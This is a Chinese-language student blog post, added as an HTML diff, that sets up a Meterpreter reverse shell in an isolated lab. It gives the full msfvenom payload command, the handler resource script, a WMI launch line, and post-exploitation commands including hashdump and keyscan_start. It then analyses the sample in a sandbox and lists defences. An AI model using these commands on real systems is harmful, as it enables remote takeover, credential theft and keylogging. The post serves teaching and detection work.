@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制 // doing</title>
+<meta name="description" content="从一条 msfvenom 命令到 Meterpreter 会话，完整走一遍反向连接的远程控制流程，再把样本丢进沙箱看它暴露了什么。">
+<meta name="author" content="doing">
+<meta name="theme-color" content="#04070f">
+<meta name="color-scheme" content="dark">
+<meta name="keywords" content="网络安全, 渗透测试, CTF, doing">
+<meta name="generator" content="Hexo">
+<link rel="canonical" href="https://doingweb666.github.io/2026/11/10/msfvenom-meterpreter/">
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制 // doing">
+<meta property="og:description" content="从一条 msfvenom 命令到 Meterpreter 会话，完整走一遍反向连接的远程控制流程，再把样本丢进沙箱看它暴露了什么。">
+<meta property="og:url" content="https://doingweb666.github.io/2026/11/10/msfvenom-meterpreter/">
+<meta property="og:site_name" content="doing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制 // doing">
+<meta name="twitter:description" content="从一条 msfvenom 命令到 Meterpreter 会话，完整走一遍反向连接的远程控制流程，再把样本丢进沙箱看它暴露了什么。">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script>document.documentElement.className += ' js';</script>
+
+</head>
+<body class="post-page">
+  <canvas id="matrix" class="matrix" aria-hidden="true"
+    data-enabled="true"
+    data-opacity="0.2"
+    data-font-size="16"
+    data-speed="1"></canvas>
+
+  <div class="crt" aria-hidden="true">
+    <div class="crt__scanlines"></div>
+    <div class="crt__vignette"></div>
+  </div>
+
+  <a class="skip-link" href="#main">跳到正文</a>
+
+  
+<header class="site-header" id="top">
+  <div class="shell header__inner">
+    <a class="brand" href="/" aria-label="doing 首页">
+      <span class="brand__prompt" aria-hidden="true">root@doing:~#</span>
+      <span class="brand__name">doing</span>
+      <span class="brand__caret" aria-hidden="true"></span>
+    </a>
+
+    <button class="nav-toggle" id="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="打开导航菜单">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      
+        <a class="site-nav__link"
+           href="/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>home
+        </a>
+      
+        <a class="site-nav__link"
+           href="/archives/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>archives
+        </a>
+      
+        <a class="site-nav__link"
+           href="/tags/"
+           >
+          <span class="site-nav__marker" aria-hidden="true">./</span>tags
+        </a>
+      
+    </nav>
+  </div>
+</header>
+
+
+  <main class="main" id="main">
+    
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<article class="post">
+  <header class="post__head">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="/">~</a>
+      <span class="crumbs__sep" aria-hidden="true">/</span>
+      <a href="/archives/">posts</a>
+      <span class="crumbs__sep" aria-hidden="true">/</span>
+      <span class="crumbs__here">msfvenom-meterpreter</span>
+    </nav>
+
+    <h1 class="post__title glitch" data-text="【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制">【课后作业】msfvenom 生成被控端与 Meterpreter 远程控制</h1>
+
+    <div class="post__meta">
+      <span class="post__meta-item"><span class="post__meta-key">date</span> <time datetime="2026-11-10T12:00:00.000Z">2026-11-10</time></span>
+      <span class="meta-dot" aria-hidden="true">•</span>
+      <span class="post__meta-item"><span class="post__meta-key">read</span> 12 min</span>
+      
+      <span class="meta-dot" aria-hidden="true">•</span>
+      <span class="post__meta-item"><span class="post__meta-key">dir</span> <a href="/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a></span>
+      
+      
+      <span class="post__meta-tags">
+        
+        <a class="tag" href="/tags/Metasploit/">#Metasploit</a>
+        
+        <a class="tag" href="/tags/msfvenom/">#msfvenom</a>
+        
+        <a class="tag" href="/tags/Meterpreter/">#Meterpreter</a>
+        
+        <a class="tag" href="/tags/%E6%B2%99%E7%AE%B1/">#沙箱</a>
+        
+      </span>
+      
+    </div>
+  </header>
+
+  <div class="post__layout has-toc">
+    <div class="file">
+      <div class="file__bar">
+        <span class="file__name"><span class="file__path" aria-hidden="true">~/posts/</span>msfvenom-meterpreter.md</span>
+        <span class="file__mode" title="只读文件">READ-ONLY</span>
+      </div>
+      <div class="file__body prose" id="post-content">
+        <p>远程控制程序分两种连接方向：<strong>正向</strong>是攻击者主动连目标，会被 NAT 和防火墙挡住；<strong>反向</strong>是目标主动连回攻击者，出站规则通常比入站宽松，所以几乎所有现代木马都用反向连接。</p>
+<p>Metasploit 把这件事做得极其简单：<code>msfvenom</code> 生成被控端，<code>multi/handler</code> 等它连回来，连上之后就是 Meterpreter 会话。</p>
+<h2 id="⚙️-实验环境"><a href="#⚙️-实验环境" class="headerlink" title="⚙️ 实验环境"></a>⚙️ 实验环境</h2><ul>
+<li>主控端：Kali Linux 2024.3（<code>192.168.80.129</code>，仅主机网卡）</li>
+<li>被控端：Windows 11 主机（<code>192.168.80.1</code>，VMware 仅主机 VMnet1，与主控端同网段）</li>
+<li>工具：Metasploit Framework（Kali 自带）</li>
+</ul>
+<p>被控端必须是<strong>隔离的虚拟机</strong>。拿主力机当靶子，全程不能接外网——反向 shell 一旦连到公网 IP，性质就变了。</p>
+<h2 id="🔧-第一步：生成被控端"><a href="#🔧-第一步：生成被控端" class="headerlink" title="🔧 第一步：生成被控端"></a>🔧 第一步：生成被控端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.80.129 LPORT=5000 -f exe -o ~/payload.exe</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>本例取值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p</code></td>
+<td>指定 payload</td>
+<td><code>windows/meterpreter/reverse_tcp</code>，Windows 平台的反向 TCP Meterpreter</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>输出格式</td>
+<td><code>exe</code>，Windows 可执行文件</td>
+</tr>
+<tr>
+<td><code>-o</code></td>
+<td>保存路径</td>
+<td><code>~/payload.exe</code></td>
+</tr>
+</tbody></table>
+<p><code>LHOST</code> 填<strong>主控端</strong>的地址（让木马知道回连到哪里），<code>LPORT</code> 是回连端口。这两个值必须和下一步 handler 里设的完全一致，否则连不回来。</p>
+<p><img src="/images/5645b9473509a3213100cf24b2bc8806.png" alt="msfvenom 生成 payload"></p>
+<p>输出里有两个数字值得注意：<code>Payload size: 354 bytes</code> 是 shellcode 本身，<code>Final size of exe file: 73802 bytes</code> 才是加了 PE 模板的成品。<strong>木马看起来很小，不代表它做的事情很少</strong>——真正的功能全在回连之后由服务端下发的 stage 里。</p>
+<h2 id="📡-第二步：启动主控端监听"><a href="#📡-第二步：启动主控端监听" class="headerlink" title="📡 第二步：启动主控端监听"></a>📡 第二步：启动主控端监听</h2><p>把参数写进资源脚本，免得每次重复敲：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set <span class="variable constant_">LHOST</span> <span class="number">192.168</span>.<span class="number">80.129</span></span><br><span class="line">set <span class="variable constant_">LPORT</span> <span class="number">5000</span></span><br><span class="line">set <span class="title class_">ExitOnSession</span> <span class="literal">false</span></span><br><span class="line">run -j</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q -r ~/handler.rc</span><br></pre></td></tr></table></figure>
+
+<p><code>multi/handler</code> 是”通用接收器”，它不攻击任何东西，只是安静地监听端口，等被控端连上来。<code>run -j</code> 表示后台运行（<code>jobs</code> 查看），<code>ExitOnSession false</code> 让会话断开后监听继续保留，方便反复测试。</p>
+<p><img src="/images/d7b130b6629390af8c0694f804f3982a.png" alt="handler 建立监听"></p>
+<p>看到 <code>Started reverse TCP handler on 192.168.80.129:5000</code> 就说明在等了。</p>
+<h2 id="💻-第三步：让被控端运行"><a href="#💻-第三步：让被控端运行" class="headerlink" title="💻 第三步：让被控端运行"></a>💻 第三步：让被控端运行</h2><p>把 <code>payload.exe</code> 传到 Windows 靶机执行。这里有个坑：如果从父进程里 <code>Start-Process</code> 拉起来，父进程一退出，payload 会被连带结束，会话刚建立就断：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (176198 bytes) to 192.168.80.1</span><br><span class="line">[-] Meterpreter session 1 is not valid and will be closed</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.80.129:5000 -&gt; 192.168.80.1:60901)</span><br><span class="line">[*] 192.168.80.1 - Meterpreter session 2 closed.  Reason: Died</span><br></pre></td></tr></table></figure>
+
+<p>改用 WMI 创建进程，payload 挂到 <code>WmiPrvSE.exe</code> 下面，不再受父进程生死影响，会话就稳住了：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([<span class="type">wmiclass</span>]<span class="string">&#x27;Win32_Process&#x27;</span>).Create(<span class="string">&#x27;C:\lab\payload.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>stage</code> 是握手后由服务端下发的第二阶段载荷（176198 字节），真正的 Meterpreter 逻辑来自这里，磁盘上不会再落第二个文件。</p>
+<h2 id="🎛️-第四步：Meterpreter-操作"><a href="#🎛️-第四步：Meterpreter-操作" class="headerlink" title="🎛️ 第四步：Meterpreter 操作"></a>🎛️ 第四步：Meterpreter 操作</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; sessions          # 看有哪些会话</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions -i 3     # 进入 3 号会话</span><br><span class="line">meterpreter &gt; sysinfo                           # 系统信息</span><br><span class="line">meterpreter &gt; getuid                            # 当前权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/404fda3637f0c18373602602ab57cbcc.png" alt="Meterpreter 会话与 sysinfo"></p>
+<blockquote>
+<p>计算机名和本地账户名属于实验机隐私，截图与下面输出中已做打码处理，用 <code>XXXXXXX</code> 代替。</p>
+</blockquote>
+<p>实测输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Computer        : LAPTOP-XXXXXXX</span><br><span class="line">OS              : Windows 11 (10.0 Build 26200).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">Server username: LAPTOP-XXXXXXX\user</span><br></pre></td></tr></table></figure>
+
+<p>从这几行能读出三件事：目标是什么系统、Meterpreter 自身是 32 位（所以会出现 <code>SysWOW64</code> 路径）、当前权限只是普通用户（演示机上的本地账户），还没到 admin。</p>
+<p>其他常用命令：</p>
+<ul>
+<li><code>getsystem</code>：尝试提权到 SYSTEM。需要管理员上下文，普通用户会失败。</li>
+<li><code>ps</code> &#x2F; <code>migrate PID</code>：找 <code>NT AUTHORITY\SYSTEM</code> 的稳定进程注入，既隐藏又提权。</li>
+<li><code>screenshot</code>：截屏；<code>shell</code>：进入 cmd。</li>
+<li><code>hashdump</code>：导出本地账户哈希（需 SYSTEM）；<code>keyscan_start</code>：键盘记录。</li>
+</ul>
+<p>这些操作全在<strong>内存中</strong>完成，磁盘上除了最初那个 exe 没有新文件落地，所以取证难度大。</p>
+<h2 id="🧪-第五步：提交微步云沙箱"><a href="#🧪-第五步：提交微步云沙箱" class="headerlink" title="🧪 第五步：提交微步云沙箱"></a>🧪 第五步：提交微步云沙箱</h2><h3 id="判定结论与标签"><a href="#判定结论与标签" class="headerlink" title="判定结论与标签"></a>判定结论与标签</h3><p><img src="/images/6ab35e59bde9e5c07e41cd70738670f1.png" alt="微步沙箱判定：恶意，场景标签 CobaltStrike 检测"></p>
+<p>评级直接给到「<strong>恶意</strong>」，场景标签命中 <code>CobaltStrike检测</code>，情报 IOC 也把 MD5 <code>8e5287ac...</code> 归到 CobaltStrike 家族；下面 MITRE ATT&amp;CK 矩阵里还标了「反调试工程」「可疑影子库」「静态文件特征」三项可疑行为。</p>
+<p>有意思的是这里出现了<strong>标签打架</strong>：微步的场景引擎判 CobaltStrike，微软 MSE 报的却是 <code>Trojan:Win32/Meterpreter.O</code>。原因不难理解 —— msfvenom 的 <code>windows/meterpreter/reverse_tcp</code> 和 CobaltStrike 的 beacon 用的是同一类反射式加载 shellcode（无文件落地、内存解密后执行），静态特征大面积重叠，不同引擎侧重不同，给出的家族名也就不同。<strong>家族名只是线索，IOC 和行为才是证据。</strong></p>
+<h3 id="多引擎检出"><a href="#多引擎检出" class="headerlink" title="多引擎检出"></a>多引擎检出</h3><p><img src="/images/0de927f99d59e40fd4d761df4ce04c1a.png" alt="28 个引擎 14 个报警，MSE 报 Meterpreter，360 报 QVM 机器学习模型"></p>
+<p>检出率 14&#x2F;28，正好一半。挑几个有代表性的看：</p>
+<table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>报出的名字</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>微软 MSE</td>
+<td><code>Trojan:Win32/Meterpreter.O</code></td>
+<td>全场唯一点出 Meterpreter 的</td>
+</tr>
+<tr>
+<td>卡巴斯基</td>
+<td><code>HEUR:Trojan.Win32.Generic</code></td>
+<td><code>HEUR</code> &#x3D; 启发式，没命中特征码</td>
+</tr>
+<tr>
+<td>ESET</td>
+<td><code>a variant of Win32/Rozena.AA</code></td>
+<td>Rozena 是老牌后门家族</td>
+</tr>
+<tr>
+<td>IKARUS &#x2F; 安天</td>
+<td><code>Trojan.Win32.Rozena</code></td>
+<td>同上，归到 Rozena</td>
+</tr>
+<tr>
+<td>Avast &#x2F; AVG</td>
+<td><code>Win32:Matshell-E</code></td>
+<td><strong>Matshell 就是 Metasploit 的通用检出名</strong></td>
+</tr>
+<tr>
+<td>360</td>
+<td><code>HEUR/QVM20.1.4B09.Malware.Gen</code></td>
+<td>QVM 是机器学习模型，不是特征码</td>
+</tr>
+<tr>
+<td>小红伞</td>
+<td><code>TR/Crypt.EPACK.Gen2</code></td>
+<td>只认出”加壳了”，没认出是什么</td>
+</tr>
+</tbody></table>
+<p>两点值得记住：<strong>看到 <code>Matshell</code> 基本可以直接判定是 msf 产物</strong>；而小红伞、卡巴斯基给的是”加壳&#x2F;启发式”这种模糊结论 —— 检出率高不等于识别准。</p>
+<h3 id="网络行为"><a href="#网络行为" class="headerlink" title="网络行为"></a>网络行为</h3><p><img src="/images/303a6eab803c7499edf85652512ed24b.png" alt="样本在沙箱内连续 7 次回连 192.168.80.129:5000"></p>
+<p>这是整份报告里最有价值的一块：样本在 30ms、51ms、72ms、93ms、114ms……连续发起 <strong>7 次 TCP 连接</strong>，目标全是 <code>192.168.80.129:5000</code>。</p>
+<p>而 <code>192.168.80.129</code> 是我本地 VMnet1 网段的主控端地址，沙箱在公网，这 7 次连接必然全部失败 —— 但<strong>握手尝试本身已经把 C2 地址完整暴露了</strong>。真实应急响应中，运维拿到这个 IOC 就能在内网全量排查”谁在往外连这个地址”。</p>
+<p>微步把它标成「白名单 &#x2F; 保留地址」，是因为 <code>192.168.x.x</code> 属于 RFC1918 私有地址，沙箱按规则认为访问内网地址不算恶意外联 —— 这是它的判定逻辑，不是它没看见。</p>
+<h3 id="内存文件：抓到了那段-shellcode"><a href="#内存文件：抓到了那段-shellcode" class="headerlink" title="内存文件：抓到了那段 shellcode"></a>内存文件：抓到了那段 shellcode</h3><p>同一页往下翻，<code>内存文件</code> 一栏里躺着一块 <strong>354 字节</strong>的 <code>Unpacked Shellcode</code>，威胁类型标 CobaltStrike，检出 6&#x2F;28。这个数字与前面 <code>msfvenom</code> 输出的 <code>Payload size: 354 bytes</code> <strong>完全一致</strong>。</p>
+<p>这就把证据链闭合了：磁盘上的 exe 只是外壳，运行时在内存里解出这 354 字节的 stage 1，再由它去拉取第二阶段。文件落地检测抓不到的东西，内存取证抓得到。</p>
+<h2 id="🛡️-这条链路怎么被防住"><a href="#🛡️-这条链路怎么被防住" class="headerlink" title="🛡️ 这条链路怎么被防住"></a>🛡️ 这条链路怎么被防住</h2><table>
+<thead>
+<tr>
+<th>环节</th>
+<th>防御手段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>生成</td>
+<td>无（本地生成，无法拦截）</td>
+</tr>
+<tr>
+<td>投递</td>
+<td>邮件网关、沙箱预检、宏禁用、Mark-of-the-Web</td>
+</tr>
+<tr>
+<td>执行</td>
+<td>EDR 行为检测（进程注入、异常 API 调用序列）、ASR 规则</td>
+</tr>
+<tr>
+<td>回连</td>
+<td>出站白名单、只允许必要端口出网、DNS 监控</td>
+</tr>
+<tr>
+<td>提权</td>
+<td>UAC、最小权限账户</td>
+</tr>
+<tr>
+<td>持久化</td>
+<td>注册表 &#x2F; 计划任务 &#x2F; 服务项监控</td>
+</tr>
+</tbody></table>
+<p>关键认知是：<strong>单靠特征码永远追不上免杀</strong>。真正有效的防线是”行为”和”出站流量”——木马可以改特征，但”一个文档突然要连陌生 IP 的 5000 端口”这件事本身就很可疑。</p>
+<h2 id="📌-补充说明"><a href="#📌-补充说明" class="headerlink" title="📌 补充说明"></a>📌 补充说明</h2><ul>
+<li><strong>msfvenom 只是打包工具</strong>：它把 shellcode 塞进 exe 模板，同一段 shellcode 换成 <code>-f python</code>、<code>-f raw</code>、<code>-f elf</code> 就能打到不同平台，理解这点比记参数重要。</li>
+<li><strong>为什么沙箱能看到 C2</strong>：因为样本真的跑起来了。加壳和混淆在”执行”面前都会露馅，这也是沙箱优于静态扫描的地方。</li>
+<li><strong>合规边界</strong>：生成和使用 Meterpreter 载荷只允许在自有或明确授权的环境进行。用于他人系统，构成《刑法》第 285 条规定的非法控制计算机信息系统罪。</li>
+</ul>
+
+      </div>
+    </div>
+
+    
+    <aside class="toc" aria-label="文章目录">
+      <p class="toc__title">// INDEX</p>
+      <nav class="toc__nav">
+        <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E2%9A%99%EF%B8%8F-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-list-text">⚙️ 实验环境</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%94%A7-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%94%9F%E6%88%90%E8%A2%AB%E6%8E%A7%E7%AB%AF"><span class="toc-list-text">🔧 第一步：生成被控端</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%93%A1-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%90%AF%E5%8A%A8%E4%B8%BB%E6%8E%A7%E7%AB%AF%E7%9B%91%E5%90%AC"><span class="toc-list-text">📡 第二步：启动主控端监听</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%92%BB-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%AE%A9%E8%A2%AB%E6%8E%A7%E7%AB%AF%E8%BF%90%E8%A1%8C"><span class="toc-list-text">💻 第三步：让被控端运行</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%8E%9B%EF%B8%8F-%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9AMeterpreter-%E6%93%8D%E4%BD%9C"><span class="toc-list-text">🎛️ 第四步：Meterpreter 操作</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%A7%AA-%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%8F%90%E4%BA%A4%E5%BE%AE%E6%AD%A5%E4%BA%91%E6%B2%99%E7%AE%B1"><span class="toc-list-text">🧪 第五步：提交微步云沙箱</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%88%A4%E5%AE%9A%E7%BB%93%E8%AE%BA%E4%B8%8E%E6%A0%87%E7%AD%BE"><span class="toc-list-text">判定结论与标签</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%A4%9A%E5%BC%95%E6%93%8E%E6%A3%80%E5%87%BA"><span class="toc-list-text">多引擎检出</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E7%BD%91%E7%BB%9C%E8%A1%8C%E4%B8%BA"><span class="toc-list-text">网络行为</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%EF%BC%9A%E6%8A%93%E5%88%B0%E4%BA%86%E9%82%A3%E6%AE%B5-shellcode"><span class="toc-list-text">内存文件：抓到了那段 shellcode</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E8%BF%99%E6%9D%A1%E9%93%BE%E8%B7%AF%E6%80%8E%E4%B9%88%E8%A2%AB%E9%98%B2%E4%BD%8F"><span class="toc-list-text">🛡️ 这条链路怎么被防住</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%F0%9F%93%8C-%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"><span class="toc-list-text">📌 补充说明</span></a></li></ol>
+      </nav>
+    </aside>
+    
+  </div>
+
+  <footer class="post__foot">
+    
+    <div class="post__tags">
+      <span class="post__tags-label" aria-hidden="true">tags:</span>
+      
+      <a class="tag" href="/tags/Metasploit/">#Metasploit</a>
+      
+      <a class="tag" href="/tags/msfvenom/">#msfvenom</a>
+      
+      <a class="tag" href="/tags/Meterpreter/">#Meterpreter</a>
+      
+      <a class="tag" href="/tags/%E6%B2%99%E7%AE%B1/">#沙箱</a>
+      
+    </div>
+    
+
+    
+    <nav class="post-nav" aria-label="上一篇 / 下一篇">
+      
+      <a class="post-nav__item post-nav__item--prev" href="/2026/11/09/vsftpd-smiley/">
+        <span class="post-nav__label"><span aria-hidden="true">←</span> PREV</span>
+        <span class="post-nav__title">【课后作业】vsftpd 2.3.4 笑脸漏洞——从源码后门到 PoC 验证</span>
+      </a>
+      
+      
+      <span class="post-nav__item is-empty post-nav__item--next"><span class="post-nav__label">// EOF_NEXT</span></span>
+      
+    </nav>
+    
+  </footer>
+</article>
+
+  </main>
+
+  
+<footer class="site-footer">
+  <div class="shell">
+    <div class="footer__grid">
+      <div class="footer__brand">
+        <p class="footer__prompt"><span class="ps1" aria-hidden="true">root@doing:~$</span> echo $SIGNATURE</p>
+        <p class="footer__signature">There is no place like 127.0.0.1.</p>
+      </div>
+
+      <div class="footer__col">
+        <p class="footer__label">// ELSEWHERE</p>
+        <a class="footer__link" href="/archives/">archives</a>
+        <a class="footer__link" href="/tags/">tags</a>
+        
+      </div>
+
+      <div class="footer__col">
+        <p class="footer__label">// SYSTEM</p>
+        <p class="footer__meta"><span>stack</span> hexo + ejs</p>
+        <p class="footer__meta"><span>uptime</span> since 2026</p>
+        <button class="matrix-toggle" id="matrix-toggle" type="button" aria-pressed="true">MATRIX: ON</button>
+      </div>
+    </div>
+
+    <div class="footer__bottom">
+      <span>© 2026 <span class="footer__name">doing</span> — all packets encrypted</span>
+      <span class="footer__eof" aria-hidden="true">[ EOF ]</span>
+      <a class="footer__top-link" href="#top">cd ~ <span aria-hidden="true">↑</span></a>
+    </div>
+  </div>
+</footer>
+
+
+  <button class="to-top" id="to-top" type="button" aria-label="返回顶部" title="回到顶部">↑</button>
+
+  
+<script src="/js/matrix.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+</body>
+</html>
